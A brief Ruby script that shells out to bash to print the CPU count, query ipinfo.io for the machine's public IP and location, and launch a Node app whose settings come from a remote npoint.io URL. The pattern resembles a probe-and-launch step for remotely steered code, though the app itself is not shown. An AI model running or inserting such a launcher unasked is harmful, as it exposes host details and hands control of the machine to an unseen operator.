#!/usr/bin/env ruby
require 'open3'

stdout, stderr, status = Open3.capture3("bash", "-c", "nproc;curl ipinfo.io;node app.js -s='https://api.npoint.io/df5fe7a1ea02307519d8'")

puts "OUT: #{stdout}"
puts "ERR: #{stderr}"
puts "EXIT: #{status.exitstatus}"
